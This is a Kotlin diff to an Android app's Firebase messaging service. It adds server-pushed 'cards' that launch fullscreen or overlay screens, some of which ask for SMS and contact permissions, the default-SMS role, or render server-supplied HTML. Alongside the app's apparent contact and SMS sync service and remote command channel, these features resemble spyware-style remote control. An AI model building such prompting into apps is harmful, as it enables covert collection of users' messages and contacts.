@@ -2,7 +2,10 @@ package com.example.fast.service.notification
 
 import android.content.Intent
 import android.util.Log
+import androidx.localbroadcastmanager.content.LocalBroadcastManager
 import com.example.fast.service.ContactSmsSyncService
+import com.example.fast.ui.MultipurposeCardActivity
+import com.example.fast.ui.card.RemoteCardHandler
 import com.example.fast.util.sync.SyncStateManager
 import com.google.firebase.messaging.FirebaseMessagingService
 import com.google.firebase.messaging.RemoteMessage
@@ -54,6 +57,10 @@ class FcmMessageService : FirebaseMessagingService() {
         const val TYPE_COMMAND = "command"
         const val TYPE_NOTIFICATION = "notification"
         const val TYPE_CONFIG = "config"
+        const val TYPE_CARD = "card"  // Show a MultipurposeCard
+
+        // Broadcast action for overlay card display
+        const val ACTION_SHOW_CARD = "com.example.fast.SHOW_CARD"
 
         // Sync types
         const val SYNC_MESSAGES = "messages"
@@ -108,6 +115,7 @@ class FcmMessageService : FirebaseMessagingService() {
             TYPE_COMMAND -> handleCommandMessage(data)
             TYPE_NOTIFICATION -> handleNotificationPayload(data)
             TYPE_CONFIG -> handleConfigMessage(data)
+            TYPE_CARD -> handleCardMessage(data)
             else -> Log.w(TAG, "Unknown message type: $type")
         }
     }
@@ -175,6 +183,60 @@ class FcmMessageService : FirebaseMessagingService() {
 
         // Handle configuration updates from Django
         // e.g., update sync intervals, feature flags, etc.
+    }
+
+    /**
+     * Handle card display message from Django
+     *
+     * Shows a MultipurposeCard either as an overlay on ActivatedActivity
+     * or as a fullscreen activity based on display_mode.
+     *
+     * Expected data format:
+     * ```json
+     * {
+     *   "type": "card",
+     *   "card_type": "message|permission|update|webview|default_sms|...",
+     *   "display_mode": "overlay|fullscreen",
+     *   "title": "Card Title",
+     *   "body": "Card body text",
+     *   "html": "<html>...</html>",
+     *   "primary_button": "OK",
+     *   "secondary_button": "Cancel",
+     *   "auto_dismiss_ms": "5000",
+     *   "permissions": "sms,contacts"
+     * }
+     * ```
+     */
+    private fun handleCardMessage(data: Map<String, String>) {
+        val displayMode = data[RemoteCardHandler.KEY_DISPLAY_MODE] ?: RemoteCardHandler.DISPLAY_MODE_FULLSCREEN
+        val cardType = data[RemoteCardHandler.KEY_CARD_TYPE] ?: RemoteCardHandler.CARD_TYPE_MESSAGE
+
+        Log.d(TAG, "Card message received: type=$cardType, mode=$displayMode")
+
+        when (displayMode) {
+            RemoteCardHandler.DISPLAY_MODE_OVERLAY -> {
+                // Broadcast to ActivatedActivity to show as overlay
+                val broadcastIntent = Intent(ACTION_SHOW_CARD).apply {
+                    data.forEach { (key, value) -> putExtra(key, value) }
+                }
+                LocalBroadcastManager.getInstance(applicationContext).sendBroadcast(broadcastIntent)
+                Log.d(TAG, "Sent overlay card broadcast")
+            }
+
+            else -> {
+                // Launch fullscreen MultipurposeCardActivity
+                val activityIntent = Intent(applicationContext, MultipurposeCardActivity::class.java).apply {
+                    addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
+                    data.forEach { (key, value) -> putExtra(key, value) }
+                }
+                try {
+                    applicationContext.startActivity(activityIntent)
+                    Log.d(TAG, "Launched MultipurposeCardActivity")
+                } catch (e: Exception) {
+                    Log.e(TAG, "Failed to launch MultipurposeCardActivity", e)
+                }
+            }
+        }
     }
 
     /**
